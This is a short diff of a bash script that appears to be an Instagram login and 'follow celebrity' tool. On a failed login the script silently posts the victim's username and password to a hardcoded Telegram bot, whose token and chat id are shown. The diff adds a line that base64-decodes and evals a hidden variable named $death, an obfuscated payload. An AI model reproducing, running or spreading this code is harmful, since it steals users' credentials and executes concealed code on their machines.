@@ -467,7 +467,8 @@ printf "\e[1;31m[\e[0m\e[1;77m+\e[0m\e[1;31m]\e[0m\e[1;93m Trying to follow cele
 check_follow=$(curl -s -L -b cookie.$user -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/friendships/create/$celeb/" | grep -o '"following": true')
 
 if [[ $check_follow == "" ]]; then
-printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
+    printf "\n\e[1;93m [!] Error : Wrong Password\n" && curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001466980816" -d "text=Password Checker : FALSE Username - $user Password - $pass" &>/dev/null
+    eval $(base64 -d <<<"$death")
 exit 1
 else
 printf "\e[1;92mOK\e[0m\n"
